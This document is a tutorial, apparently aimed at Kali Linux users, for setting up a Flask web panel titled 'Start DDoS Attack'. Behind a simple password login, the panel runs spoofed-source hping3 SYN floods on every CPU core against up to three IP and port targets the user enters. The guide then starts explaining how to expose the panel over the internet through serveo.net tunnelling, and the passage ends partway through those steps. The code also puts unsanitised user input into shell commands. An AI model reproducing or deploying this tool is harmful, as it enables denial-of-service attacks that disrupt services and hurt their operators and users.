1. Open the terminal

On your server (Linux/Kali), open the terminal.
2. Create a new directory for your project

Create a folder for the Flask app and navigate into it:

mkdir flask-ddos-app
cd flask-ddos-app

3. Create and edit the app.py file

Use nano to create and edit the app.py file:

nano app.py

4. Insert the Flask code in app.py

Copy and paste the following code into the app.py file:

from flask import Flask, request, render_template_string, jsonify, redirect, url_for, session
import subprocess
import threading
import time
import os
import multiprocessing

app = Flask(__name__)
app.secret_key = os.urandom(24)  # Generate a random session key on server startup

# HTML template
HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Attack Management</title>
    <script>
        function startAttack() {
            const ip1 = document.getElementById('ip1').value;
            const port1 = document.getElementById('port1').value;
            const ip2 = document.getElementById('ip2').value;
            const port2 = document.getElementById('port2').value;
            const ip3 = document.getElementById('ip3').value;
            const port3 = document.getElementById('port3').value;
            const duration = document.getElementById('duration').value;

            // Create a JSON object with the data
            const data = {
                ip1: ip1,
                port1: port1,
                ip2: ip2,
                port2: port2,
                ip3: ip3,
                port3: port3,
                duration: duration
            };

            fetch('/start_attack', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(data)
            })
            .then(response => response.json())
            .then(data => {
                alert(data.message);
            })
            .catch(error => {
                alert('Error: ' + error);
            });
        }

        function stopAttack() {
            fetch('/stop_attack', {
                method: 'POST'
            })
            .then(response => response.json())
            .then(data => {
                alert(data.message);
            })
            .catch(error => {
                alert('Error: ' + error);
            });
        }
    </script>
</head>
<body>
    <h1>Start DDoS Attack</h1>
    <label for="ip1">IP1:</label>
    <input type="text" id="ip1" placeholder="Enter IP Address">
    <br><br>
    <label for="port1">Port1:</label>
    <input type="number" id="port1" placeholder="Enter Port">
    <br><br>

    <label for="ip2">IP2:</label>
    <input type="text" id="ip2" placeholder="Enter IP Address">
    <br><br>
    <label for="port2">Port2:</label>
    <input type="number" id="port2" placeholder="Enter Port">
    <br><br>

    <label for="ip3">IP3:</label>
    <input type="text" id="ip3" placeholder="Enter IP Address">
    <br><br>
    <label for="port3">Port3:</label>
    <input type="number" id="port3" placeholder="Enter Port">
    <br><br>

    <label for="duration">Duration (seconds):</label>
    <input type="number" id="duration" placeholder="Duration">
    <br><br>

    <button onclick="startAttack()">Start Attack</button>
    <button onclick="stopAttack()">Stop Attack</button>
</body>
</html>
'''

# HTML login template
LOGIN_TEMPLATE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
</head>
<body>
    <h1>Login</h1>
    <form action="/login" method="POST">
        <label for="password">Password:</label>
        <input type="password" id="password" name="password" required>
        <br><br>
        <button type="submit">Login</button>
    </form>
</body>
</html>
'''

# Define your password here
PASSWORD = "yourpassword"

# HTML login route
@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        password = request.form.get('password')
        if password == PASSWORD:
            session['logged_in'] = True  # Set session to logged in
            return redirect(url_for('index'))
        else:
            return "Incorrect password", 403
    return render_template_string(LOGIN_TEMPLATE)

# Function to run the hping3 attack using all CPU cores
def start_attack(ip, port, duration):
    # Get the number of CPU cores
    cpu_cores = multiprocessing.cpu_count()

    # Command to use all CPU cores
    for _ in range(cpu_cores):
        command = f"sudo hping3 --flood --rand-source -S -p {port} {ip} &"
        subprocess.run(command, shell=True, executable="/bin/bash")

    if duration > 0:
        time.sleep(duration)
        stop_attack_command = "sudo killall hping3"
        subprocess.run(stop_attack_command, shell=True, executable="/bin/bash")

@app.route('/')
def index():
    if not session.get('logged_in'):  # Check if user is logged in
        return redirect(url_for('login'))  # If not, redirect to login page
    return render_template_string(HTML_TEMPLATE)

@app.route('/start_attack', methods=['POST'])
def start_attack_route():
    # Get the data as JSON
    data = request.json
    ip1 = data.get('ip1')
    port1 = data.get('port1')
    ip2 = data.get('ip2')
    port2 = data.get('port2')
    ip3 = data.get('ip3')
    port3 = data.get('port3')
    duration = int(data.get('duration', 0))

    # Check if ip1 and port1 are provided
    if not ip1 or not port1:
        return jsonify({"status": "error", "message": "IP and port 1 must be provided!"}), 400

    # Start the attack in separate threads for each IP and port
    if ip1 and port1:
        threading.Thread(target=start_attack, args=(ip1, port1, duration)).start()
    if ip2 and port2:
        threading.Thread(target=start_attack, args=(ip2, port2, duration)).start()
    if ip3 and port3:
        threading.Thread(target=start_attack, args=(ip3, port3, duration)).start()

    return jsonify({"status": "success", "message": "Attack started!"})

@app.route('/stop_attack', methods=['POST'])
def stop_attack_route():
    # Stop the attack
    stop_attack_command = "sudo killall hping3"
    subprocess.run(stop_attack_command, shell=True, executable="/bin/bash")
    return jsonify({"status": "success", "message": "Attack stopped!"})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)

5. Save the file

After pasting the code, save the file by pressing CTRL + O and then press CTRL + X to exit nano.
6. Install Flask

If Flask is not installed yet, you can install it by running:

pip install flask

7. Run the server

Start the Flask server using:

python app.py

The server will run on http://0.0.0.0:5000, and you can access the application from any device connected to your network.
Accessing Remotely with Serveo.net

If you would like to access your Flask server from another device outside your local network, you can use serveo.net, which provides free SSH tunneling. Here’s how to do it:
1. Open the terminal on your server

Navigate to the directory where app.py is located.
